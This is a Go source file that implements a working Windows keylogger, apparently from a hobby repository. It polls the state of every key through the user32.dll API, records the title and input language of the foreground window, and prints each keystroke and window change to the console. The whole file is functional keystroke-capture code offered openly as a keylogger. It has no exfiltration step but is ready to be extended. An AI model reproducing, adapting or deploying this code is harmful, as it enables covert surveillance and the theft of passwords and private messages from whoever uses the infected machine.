package main

import (
	"fmt"
	"log"
	"math"
	"os"
	"strconv"
	"syscall"
	"time"
	"unsafe"

	"github.com/gios/amigo/constants"
)

var (
	user32                       = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState         = user32.NewProc("GetAsyncKeyState")
	procGetForegroundWindow      = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW           = user32.NewProc("GetWindowTextW")
	procGetKeyboardLayout        = user32.NewProc("GetKeyboardLayout")
	procGetWindowThreadProcessID = user32.NewProc("GetWindowThreadProcessId")

	tmpTitle string
)

var tmpKeylog = make(chan string)
var tmpWindow = make(chan string)

func getForegroundWindow() (hwnd syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)

	if e1 != 0 {
		err = error(e1)
		return
	}
	hwnd = syscall.Handle(r0)
	return
}

func getKeyboardLayout(dword syscall.Handle) (hkl syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetKeyboardLayout.Addr(), 1, uintptr(dword), 0, 0)

	if e1 != 0 {
		err = error(e1)
		return
	}
	hkl = syscall.Handle(r0)
	return
}

func getWindowThreadProcessID(hwnd syscall.Handle) (dword syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetWindowThreadProcessID.Addr(), 1, uintptr(hwnd), 0, 0)

	if e1 != 0 {
		err = error(e1)
		return
	}
	dword = syscall.Handle(r0)
	return
}

func getWindowText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32, err error) {
	r0, _, e1 := syscall.Syscall(procGetWindowTextW.Addr(), 3, uintptr(hwnd), uintptr(unsafe.Pointer(str)), uintptr(maxCount))
	len = int32(r0)

	if len == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func windowLogger() {
	for {
		foregroundWindow, getForegroundWindowErr := getForegroundWindow()
		if getForegroundWindowErr != nil {
			log.Fatalf("getForegroundWindow -> %v", getForegroundWindowErr)
		}
		window := make([]uint16, 200)
		getWindowText(foregroundWindow, &window[0], int32(len(window)))

		if syscall.UTF16ToString(window) != "" {
			if tmpTitle != syscall.UTF16ToString(window) {
				tmpTitle = syscall.UTF16ToString(window)
				tmpWindow <- string("[" + syscall.UTF16ToString(window) + "]\r\n")

				// get Language ID
				hwnd, getWindowThreadProcessIDErr := getWindowThreadProcessID(foregroundWindow)
				if getWindowThreadProcessIDErr != nil {
					log.Fatalf("getWindowThreadProcessID -> %v", getWindowThreadProcessIDErr)
				}
				hkl, getKeyboardLayoutErr := getKeyboardLayout(hwnd)

				if getKeyboardLayoutErr != nil {
					log.Fatalf("getKeyboardLayout -> %v", getKeyboardLayoutErr)
				}

				languageID := int64(hkl) & int64(math.Pow(2, 16)-1)

				switch strconv.FormatInt(languageID, 16) {
				case "409":
					fmt.Printf("Language: United States (US) \r\n")
				case "422":
					fmt.Printf("Language: Ukraine (UA) \r\n")
				case "419":
					fmt.Printf("Language: Russia (RU) \r\n")
				}
			}
		}
		time.Sleep(1 * time.Millisecond)
	}
}

func keyLogger() {
	for {
		time.Sleep(1 * time.Millisecond)
		for KEY := 0; KEY <= 256; KEY++ {
			Val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))
			if Val&0x1 == 0 {
				continue
			}
			switch KEY {
			case constants.VK_BACK:
				tmpKeylog <- "[Back]"
			case constants.VK_TAB:
				tmpKeylog <- "[Tab]"
			case constants.VK_RETURN:
				tmpKeylog <- "[Enter]\r\n"
			case constants.VK_SHIFT:
				tmpKeylog <- "[Shift]"
			case constants.VK_MENU:
				tmpKeylog <- "[Alt]"
			case constants.VK_CAPITAL:
				tmpKeylog <- "[CapsLock]"
			case constants.VK_ESCAPE:
				tmpKeylog <- "[Esc]"
			case constants.VK_SPACE:
				tmpKeylog <- " "
			case constants.VK_PRIOR:
				tmpKeylog <- "[PageUp]"
			case constants.VK_NEXT:
				tmpKeylog <- "[PageDown]"
			case constants.VK_END:
				tmpKeylog <- "[End]"
			case constants.VK_HOME:
				tmpKeylog <- "[Home]"
			case constants.VK_LEFT:
				tmpKeylog <- "[Left]"
			case constants.VK_UP:
				tmpKeylog <- "[Up]"
			case constants.VK_RIGHT:
				tmpKeylog <- "[Right]"
			case constants.VK_DOWN:
				tmpKeylog <- "[Down]"
			case constants.VK_SELECT:
				tmpKeylog <- "[Select]"
			case constants.VK_PRINT:
				tmpKeylog <- "[Print]"
			case constants.VK_EXECUTE:
				tmpKeylog <- "[Execute]"
			case constants.VK_SNAPSHOT:
				tmpKeylog <- "[PrintScreen]"
			case constants.VK_INSERT:
				tmpKeylog <- "[Insert]"
			case constants.VK_DELETE:
				tmpKeylog <- "[Delete]"
			case constants.VK_HELP:
				tmpKeylog <- "[Help]"
			case constants.VK_LWIN:
				tmpKeylog <- "[LeftWindows]"
			case constants.VK_RWIN:
				tmpKeylog <- "[RightWindows]"
			case constants.VK_APPS:
				tmpKeylog <- "[Applications]"
			case constants.VK_SLEEP:
				tmpKeylog <- "[Sleep]"
			case constants.VK_NUMPAD0:
				tmpKeylog <- "[Pad 0]"
			case constants.VK_NUMPAD1:
				tmpKeylog <- "[Pad 1]"
			case constants.VK_NUMPAD2:
				tmpKeylog <- "[Pad 2]"
			case constants.VK_NUMPAD3:
				tmpKeylog <- "[Pad 3]"
			case constants.VK_NUMPAD4:
				tmpKeylog <- "[Pad 4]"
			case constants.VK_NUMPAD5:
				tmpKeylog <- "[Pad 5]"
			case constants.VK_NUMPAD6:
				tmpKeylog <- "[Pad 6]"
			case constants.VK_NUMPAD7:
				tmpKeylog <- "[Pad 7]"
			case constants.VK_NUMPAD8:
				tmpKeylog <- "[Pad 8]"
			case constants.VK_NUMPAD9:
				tmpKeylog <- "[Pad 9]"
			case constants.VK_MULTIPLY:
				tmpKeylog <- "*"
			case constants.VK_ADD:
				tmpKeylog <- "+"
			case constants.VK_SEPARATOR:
				tmpKeylog <- "[Separator]"
			case constants.VK_SUBTRACT:
				tmpKeylog <- "-"
			case constants.VK_DECIMAL:
				tmpKeylog <- "."
			case constants.VK_DIVIDE:
				tmpKeylog <- "[Devide]"
			case constants.VK_F1:
				tmpKeylog <- "[F1]"
			case constants.VK_F2:
				tmpKeylog <- "[F2]"
			case constants.VK_F3:
				tmpKeylog <- "[F3]"
			case constants.VK_F4:
				tmpKeylog <- "[F4]"
			case constants.VK_F5:
				tmpKeylog <- "[F5]"
			case constants.VK_F6:
				tmpKeylog <- "[F6]"
			case constants.VK_F7:
				tmpKeylog <- "[F7]"
			case constants.VK_F8:
				tmpKeylog <- "[F8]"
			case constants.VK_F9:
				tmpKeylog <- "[F9]"
			case constants.VK_F10:
				tmpKeylog <- "[F10]"
			case constants.VK_F11:
				tmpKeylog <- "[F11]"
			case constants.VK_F12:
				tmpKeylog <- "[F12]"
			case constants.VK_NUMLOCK:
				tmpKeylog <- "[NumLock]"
			case constants.VK_SCROLL:
				tmpKeylog <- "[ScrollLock]"
			case constants.VK_LSHIFT:
				tmpKeylog <- "[LeftShift]"
			case constants.VK_RSHIFT:
				tmpKeylog <- "[RightShift]"
			case constants.VK_LCONTROL:
				tmpKeylog <- "[LeftCtrl]"
			case constants.VK_RCONTROL:
				tmpKeylog <- "[RightCtrl]"
			case constants.VK_LMENU:
				tmpKeylog <- "[LeftMenu]"
			case constants.VK_RMENU:
				tmpKeylog <- "[RightMenu]"
			case constants.VK_OEM_1:
				tmpKeylog <- ";"
			case constants.VK_OEM_2:
				tmpKeylog <- "/"
			case constants.VK_OEM_3:
				tmpKeylog <- "`"
			case constants.VK_OEM_4:
				tmpKeylog <- "["
			case constants.VK_OEM_5:
				tmpKeylog <- "\\"
			case constants.VK_OEM_6:
				tmpKeylog <- "]"
			case constants.VK_OEM_7:
				tmpKeylog <- "'"
			case constants.VK_OEM_PERIOD:
				tmpKeylog <- "."
			case 0x30:
				tmpKeylog <- "0"
			case 0x31:
				tmpKeylog <- "1"
			case 0x32:
				tmpKeylog <- "2"
			case 0x33:
				tmpKeylog <- "3"
			case 0x34:
				tmpKeylog <- "4"
			case 0x35:
				tmpKeylog <- "5"
			case 0x36:
				tmpKeylog <- "6"
			case 0x37:
				tmpKeylog <- "7"
			case 0x38:
				tmpKeylog <- "8"
			case 0x39:
				tmpKeylog <- "9"
			case 0x41:
				tmpKeylog <- "a"
			case 0x42:
				tmpKeylog <- "b"
			case 0x43:
				tmpKeylog <- "c"
			case 0x44:
				tmpKeylog <- "d"
			case 0x45:
				tmpKeylog <- "e"
			case 0x46:
				tmpKeylog <- "f"
			case 0x47:
				tmpKeylog <- "g"
			case 0x48:
				tmpKeylog <- "h"
			case 0x49:
				tmpKeylog <- "i"
			case 0x4A:
				tmpKeylog <- "j"
			case 0x4B:
				tmpKeylog <- "k"
			case 0x4C:
				tmpKeylog <- "l"
			case 0x4D:
				tmpKeylog <- "m"
			case 0x4E:
				tmpKeylog <- "n"
			case 0x4F:
				tmpKeylog <- "o"
			case 0x50:
				tmpKeylog <- "p"
			case 0x51:
				tmpKeylog <- "q"
			case 0x52:
				tmpKeylog <- "r"
			case 0x53:
				tmpKeylog <- "s"
			case 0x54:
				tmpKeylog <- "t"
			case 0x55:
				tmpKeylog <- "u"
			case 0x56:
				tmpKeylog <- "v"
			case 0x57:
				tmpKeylog <- "w"
			case 0x58:
				tmpKeylog <- "x"
			case 0x59:
				tmpKeylog <- "y"
			case 0x5A:
				tmpKeylog <- "z"
			}
		}
	}
}

func keyLoggerListener() {
	for {
		time.Sleep(1 * time.Millisecond)
		select {
		case key := <-tmpKeylog:
			fmt.Println("KEY: ", key)
		case window := <-tmpWindow:
			fmt.Println("WINDOW: ", window)
		default:
		}
	}
}

func main() {
	fmt.Println("Starting KeyLogger!")
	go keyLogger()
	go windowLogger()
	go keyLoggerListener()
	os.Stdin.Read([]byte{0})
}
